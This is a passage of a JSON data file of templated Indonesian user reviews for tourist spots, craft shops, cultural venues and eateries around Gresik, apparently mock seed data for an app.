                "timestamp": "2026-05-24T14:36:35.402Z"
            },
            {
                "id": "r203",
                "merchantId": "m68",
                "userName": "Haji_Sukri_26",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-23T14:36:35.402Z"
            },
            {
                "id": "r204",
                "merchantId": "m68",
                "userName": "Neng_Siti_81",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r205",
                "merchantId": "m69",
                "userName": "Mak_Jah_96",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r206",
                "merchantId": "m69",
                "userName": "Haji_Sukri_48",
                "rating": 5,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r207",
                "merchantId": "m69",
                "userName": "Neng_Siti_87",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r208",
                "merchantId": "m70",
                "userName": "Mak_Jah_55",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-25T14:36:35.402Z"
            },
            {
                "id": "r209",
                "merchantId": "m70",
                "userName": "Haji_Sukri_96",
                "rating": 4,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-26T14:36:35.402Z"
            },
            {
                "id": "r210",
                "merchantId": "m70",
                "userName": "Neng_Siti_32",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r211",
                "merchantId": "m71",
                "userName": "Mak_Jah_73",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r212",
                "merchantId": "m71",
                "userName": "Haji_Sukri_26",
                "rating": 4,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r213",
                "merchantId": "m71",
                "userName": "Neng_Siti_15",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r214",
                "merchantId": "m72",
                "userName": "Mak_Jah_10",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-24T14:36:35.402Z"
            },
            {
                "id": "r215",
                "merchantId": "m72",
                "userName": "Haji_Sukri_55",
                "rating": 5,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-14T14:36:35.402Z"
            },
            {
                "id": "r216",
                "merchantId": "m72",
                "userName": "Neng_Siti_78",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r217",
                "merchantId": "m73",
                "userName": "Mak_Jah_32",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r218",
                "merchantId": "m73",
                "userName": "Haji_Sukri_41",
                "rating": 5,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r219",
                "merchantId": "m73",
                "userName": "Neng_Siti_36",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-21T14:36:35.402Z"
            },
            {
                "id": "r220",
                "merchantId": "m74",
                "userName": "Mak_Jah_92",
                "rating": 4,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r221",
                "merchantId": "m74",
                "userName": "Haji_Sukri_99",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r222",
                "merchantId": "m74",
                "userName": "Neng_Siti_84",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r223",
                "merchantId": "m75",
                "userName": "Mak_Jah_65",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-26T14:36:35.402Z"
            },
            {
                "id": "r224",
                "merchantId": "m75",
                "userName": "Haji_Sukri_46",
                "rating": 5,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-24T14:36:35.402Z"
            },
            {
                "id": "r225",
                "merchantId": "m75",
                "userName": "Neng_Siti_43",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-27T14:36:35.402Z"
            },
            {
                "id": "r226",
                "merchantId": "m76",
                "userName": "Mak_Jah_26",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r227",
                "merchantId": "m76",
                "userName": "Haji_Sukri_37",
                "rating": 4,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-25T14:36:35.402Z"
            },
            {
                "id": "r228",
                "merchantId": "m76",
                "userName": "Neng_Siti_58",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-24T14:36:35.402Z"
            },
            {
                "id": "r229",
                "merchantId": "m77",
                "userName": "Mak_Jah_76",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r230",
                "merchantId": "m77",
                "userName": "Haji_Sukri_17",
                "rating": 5,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r231",
                "merchantId": "m77",
                "userName": "Neng_Siti_89",
                "rating": 5,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r232",
                "merchantId": "m78",
                "userName": "Haji_Sukri_28",
                "rating": 4,
                "text": "Anak-anak sangat senang bermain istana balon dan naik sepeda layang keliling kebun lontar sejuk.",
                "timestamp": "2026-05-26T14:36:35.402Z"
            },
            {
                "id": "r233",
                "merchantId": "m78",
                "userName": "Neng_Siti_91",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r234",
                "merchantId": "m78",
                "userName": "Warkop_Lover_90",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-23T14:36:35.402Z"
            },
            {
                "id": "r235",
                "merchantId": "m79",
                "userName": "Mak_Jah_79",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r236",
                "merchantId": "m79",
                "userName": "Haji_Sukri_33",
                "rating": 5,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r237",
                "merchantId": "m79",
                "userName": "Neng_Siti_43",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r238",
                "merchantId": "m80",
                "userName": "Mak_Jah_93",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r239",
                "merchantId": "m80",
                "userName": "Haji_Sukri_84",
                "rating": 5,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r240",
                "merchantId": "m80",
                "userName": "Neng_Siti_94",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-21T14:36:35.402Z"
            },
            {
                "id": "r241",
                "merchantId": "m81",
                "userName": "Mak_Jah_62",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r242",
                "merchantId": "m81",
                "userName": "Haji_Sukri_53",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r243",
                "merchantId": "m81",
                "userName": "Neng_Siti_30",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r244",
                "merchantId": "m82",
                "userName": "Mak_Jah_69",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-25T14:36:35.402Z"
            },
            {
                "id": "r245",
                "merchantId": "m82",
                "userName": "Haji_Sukri_64",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-23T14:36:35.402Z"
            },
            {
                "id": "r246",
                "merchantId": "m82",
                "userName": "Neng_Siti_45",
                "rating": 5,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r247",
                "merchantId": "m83",
                "userName": "Haji_Sukri_36",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r248",
                "merchantId": "m83",
                "userName": "Neng_Siti_75",
                "rating": 5,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r249",
                "merchantId": "m83",
                "userName": "Warkop_Lover_25",
                "rating": 5,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r250",
                "merchantId": "m84",
                "userName": "Mak_Jah_72",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-14T14:36:35.402Z"
            },
            {
                "id": "r251",
                "merchantId": "m84",
                "userName": "Haji_Sukri_90",
                "rating": 5,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r252",
                "merchantId": "m84",
                "userName": "Neng_Siti_43",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r253",
                "merchantId": "m85",
                "userName": "Mak_Jah_11",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r254",
                "merchantId": "m85",
                "userName": "Haji_Sukri_66",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-25T14:36:35.402Z"
            },
            {
                "id": "r255",
                "merchantId": "m85",
                "userName": "Neng_Siti_66",
                "rating": 5,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r256",
                "merchantId": "m86",
                "userName": "Mak_Jah_73",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r257",
                "merchantId": "m86",
                "userName": "Haji_Sukri_42",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-21T14:36:35.402Z"
            },
            {
                "id": "r258",
                "merchantId": "m86",
                "userName": "Neng_Siti_99",
                "rating": 5,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r259",
                "merchantId": "m87",
                "userName": "Mak_Jah_89",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r260",
                "merchantId": "m87",
                "userName": "Haji_Sukri_87",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r261",
                "merchantId": "m87",
                "userName": "Neng_Siti_48",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r262",
                "merchantId": "m88",
                "userName": "Mak_Jah_55",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r263",
                "merchantId": "m88",
                "userName": "Haji_Sukri_43",
                "rating": 4,
                "text": "Upacara adat sedekah bumi festival musik rebana jidur yang sangat meriah mempersatukan kerukunan warga.",
                "timestamp": "2026-05-23T14:36:35.402Z"
            },
            {
                "id": "r264",
                "merchantId": "m88",
                "userName": "Neng_Siti_88",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-26T14:36:35.402Z"
            },
            {
                "id": "r265",
                "merchantId": "m89",
                "userName": "Haji_Sukri_60",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r266",
                "merchantId": "m89",
                "userName": "Neng_Siti_90",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-17T14:36:35.402Z"
            },
            {
                "id": "r267",
                "merchantId": "m89",
                "userName": "Warkop_Lover_73",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-28T14:36:35.402Z"
            },
            {
                "id": "r268",
                "merchantId": "m90",
                "userName": "Mak_Jah_53",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r269",
                "merchantId": "m90",
                "userName": "Haji_Sukri_11",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-22T14:36:35.402Z"
            },
            {
                "id": "r270",
                "merchantId": "m90",
                "userName": "Neng_Siti_95",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r271",
                "merchantId": "m91",
                "userName": "Mak_Jah_57",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-23T14:36:35.402Z"
            },
            {
                "id": "r272",
                "merchantId": "m91",
                "userName": "Haji_Sukri_69",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r273",
                "merchantId": "m91",
                "userName": "Neng_Siti_28",
                "rating": 5,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r274",
                "merchantId": "m92",
                "userName": "Mak_Jah_67",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r275",
                "merchantId": "m92",
                "userName": "Haji_Sukri_54",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r276",
                "merchantId": "m92",
                "userName": "Neng_Siti_96",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r277",
                "merchantId": "m93",
                "userName": "Mak_Jah_30",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r278",
                "merchantId": "m93",
                "userName": "Haji_Sukri_45",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r279",
                "merchantId": "m93",
                "userName": "Neng_Siti_73",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r280",
                "merchantId": "m94",
                "userName": "Mak_Jah_77",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r281",
                "merchantId": "m94",
                "userName": "Haji_Sukri_84",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r282",
                "merchantId": "m94",
                "userName": "Neng_Siti_90",
                "rating": 5,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r283",
                "merchantId": "m95",
                "userName": "Mak_Jah_47",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r284",
                "merchantId": "m95",
                "userName": "Haji_Sukri_40",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r285",
                "merchantId": "m95",
                "userName": "Neng_Siti_26",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r286",
                "merchantId": "m96",
                "userName": "Mak_Jah_73",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r287",
                "merchantId": "m96",
                "userName": "Haji_Sukri_59",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r288",
                "merchantId": "m96",
                "userName": "Neng_Siti_80",
                "rating": 5,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r289",
                "merchantId": "m97",
                "userName": "Mak_Jah_24",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r290",
                "merchantId": "m97",
                "userName": "Haji_Sukri_16",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r291",
                "merchantId": "m97",
                "userName": "Neng_Siti_38",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r292",
                "merchantId": "m98",
                "userName": "Mak_Jah_68",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r293",
                "merchantId": "m98",
                "userName": "Haji_Sukri_78",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r294",
                "merchantId": "m98",
                "userName": "Neng_Siti_97",
                "rating": 5,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r295",
                "merchantId": "m99",
                "userName": "Mak_Jah_89",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r296",
                "merchantId": "m99",
                "userName": "Haji_Sukri_53",
                "rating": 5,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r297",
                "merchantId": "m99",
                "userName": "Neng_Siti_11",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r298",
                "merchantId": "m100",
                "userName": "Mak_Jah_47",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r299",
                "merchantId": "m100",
                "userName": "Haji_Sukri_19",
                "rating": 4,
                "text": "Pusat konservasi rusa dan adopsi terumbu karang di dasar laut pulau yang sangat mendidik sekali.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r300",
                "merchantId": "m100",
                "userName": "Neng_Siti_43",
                "rating": 5,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r301",
                "merchantId": "m101",
                "userName": "Warkop_Lover_35",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r302",
                "merchantId": "m101",
                "userName": "Sejarah_RI_33",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r303",
                "merchantId": "m101",
                "userName": "Keluarga_Ceria_85",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r304",
                "merchantId": "m102",
                "userName": "Warkop_Lover_60",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r305",
                "merchantId": "m102",
                "userName": "Sejarah_RI_42",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r306",
                "merchantId": "m102",
                "userName": "Keluarga_Ceria_28",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r307",
                "merchantId": "m103",
                "userName": "Warkop_Lover_82",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r308",
                "merchantId": "m103",
                "userName": "Sejarah_RI_60",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r309",
                "merchantId": "m103",
                "userName": "Keluarga_Ceria_37",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r310",
                "merchantId": "m104",
                "userName": "Warkop_Lover_26",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r311",
                "merchantId": "m104",
                "userName": "Sejarah_RI_75",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r312",
                "merchantId": "m104",
                "userName": "Keluarga_Ceria_29",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r313",
                "merchantId": "m105",
                "userName": "Warkop_Lover_42",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r314",
                "merchantId": "m105",
                "userName": "Sejarah_RI_70",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r315",
                "merchantId": "m105",
                "userName": "Keluarga_Ceria_64",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r316",
                "merchantId": "m106",
                "userName": "Warkop_Lover_74",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r317",
                "merchantId": "m106",
                "userName": "Sejarah_RI_54",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r318",
                "merchantId": "m106",
                "userName": "Keluarga_Ceria_62",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
